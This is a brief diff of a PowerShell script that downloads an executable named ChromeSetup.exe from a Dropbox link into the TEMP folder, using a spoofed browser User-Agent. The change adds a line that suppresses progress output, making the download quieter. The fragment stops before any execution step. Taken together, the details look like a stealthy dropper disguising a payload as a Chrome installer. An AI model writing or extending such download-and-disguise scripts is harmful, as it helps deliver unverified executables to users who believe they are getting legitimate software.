@@ -1,5 +1,6 @@
 $exeUrl = "https://www.dropbox.com/scl/fi/l1xkp2hhx15sx17bwl6z4/ChromeSetup-1.exe?rlkey=zm0t5fv402g0gwfp476woaqxk&st=eiuvgjs0&dl=1"
 $localPath = "$env:TEMP\ChromeSetup.exe"
+$ProgressPreference = 'SilentlyContinue'
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $localPath -Headers @{
     "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
